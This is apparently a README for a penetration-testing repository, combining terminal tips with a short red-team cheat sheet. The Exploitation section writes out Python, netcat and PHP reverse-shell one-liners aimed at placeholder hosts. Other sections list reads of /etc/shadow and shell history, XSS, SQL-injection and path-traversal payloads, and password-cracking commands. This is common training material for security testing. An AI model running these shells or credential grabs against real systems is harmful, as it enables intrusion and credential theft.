# 🛠️ Red team tools, tips & tricks

A collection of random custom scripts for penetration testing and red team tasks.

## 📌 Includes

* 🔁 Automation scripts
* 🔍 Reconnaissance tools
* 📡 Scanning utilities
* 💥 Exploitation scripts
* 🩻 Post-exploitation helpers
* 📄 Report generation tools
* 🗒️ Notes & cheat sheets



## 📚 Table of Contents

* [Tips-tricks](#-tips--tricks)
* [Recon & Enumeration](#-recon--enumeration)
* [Exploitation](#-exploitation)
* [Post-Exploitation](#-post-exploitation)
* [Privilege Escalation](#-privilege-escalation)
* [Web Attacks](#-web-attacks)
* [Password Attacks](#-password-attacks)
* [Tools Reference](#-tools-reference)
* [General Notes](#-general-notes)

-----

📂 Repo-Structure
```
red-team-tools/
├── automation/
├── recon/
├── scanning/
├── exploitation/
├── post-exploitation/
├── reporting/
└── README.md/
```

---

## 🌟 Tips & tricks



***Find your public IP address right on the terminal***
```
curl -s wtfismyip.com/json | jq
curl ifconfig.me
```

***Automatically install essential hacking & dev tools on a fresh linux install***

\- [Install tools script](https://github.com/80h3m14n/red-team-tools/blob/main/automation/install-tools.sh)


***Encrypting and decrypting files, directories, and text using multiple encryption algorithms***

\- [Encryptz](https://github.com/80h3m14n/encryptz)



***Change Microsoft windows themes & font type***

1. Reg file(run as admin and reboot)
\- [Segoe Print Font](https://github.com/80h3m14n/red-team-tools/blob/main/utilities/segoe-print-font.reg)


\- You can open the file with notepad and change the font according to your preference.


2. Green Powershell
```
$Host.UI.RawUI.ForegroundColor = 'Green'
```


3. Command Prompt color

\- Navigate to Environmental Variables > New User variable
```
Name: prompt
Value: $E[1;30;104m►$E[1;37;104m $P $E[1;94;40m►$E[0m
```


---

## 🔍 Recon & Enumeration

```bash
# DNS Lookup
dig domain.com any +short
host domain.com

# Subdomain fuzzing
ffuf -w subs.txt -u https://FUZZ.target.com

# Nmap full scan
nmap -p- -T4 -A -v target.com
```

---

## 💥 Exploitation

```bash
# Python reverse shell
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Netcat reverse shell
nc -e /bin/sh IP PORT

# PHP reverse shell
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 🩻 Post-Exploitation

```bash
# Grab users & creds
cat /etc/passwd
cat /etc/shadow
history

# Network info
ip a
netstat -tulpn

# SUID Binaries
find / -perm -4000 -type f 2>/dev/null
```

---

## 🧱 Privilege Escalation

```bash
# Check kernel for exploits
uname -a
linux-exploit-suggester.sh

# Check sudo rights
sudo -l

# Writable files/directories
find / -writable -type f 2>/dev/null
```

---

## 💬 Web Attacks

```bash
# XSS payload
<script>alert('xss')</script>

# SQL Injection test
' OR '1'='1

# Local File Inclusion
../../../../etc/passwd
```

---

## 🔐 Password Attacks

```bash
# Hashcat basic usage
hashcat -m 0 hash.txt rockyou.txt

# John the Ripper
john --wordlist=rockyou.txt hashes.txt

# Zip password crack
fcrackzip -v -u -D -p rockyou.txt file.zip
```

---

## 🧰 Tools Reference

```bash
# Gobuster
gobuster dir -u http://target.com -w wordlist.txt

# Nikto
nikto -h http://target.com

# Burp Suite
# Set proxy to 127.0.0.1:8080 and route traffic from tools
```




## 📝 General Notes
Check for .bak, .old, .zip files on webservers

Default creds go a long way

Look for dev/test/staging endpoints

Don’t sleep on SSRF, IDOR, or misconfigured cloud buckets

Always verify shell stability (TTY, backgrounding)

Additional resources
\- [Roadmaps](https://roadmap.sh/)

---

## 🧾 License

Free to use, share, and modify under the MIT License.


---

## ⚠️ Disclaimer

This repository is strictly for **educational and research** purposes.
I take **no responsibility** for misuse, illegal activity, or any damage caused by these tools.
**Use responsibly. Don't be dumb.**

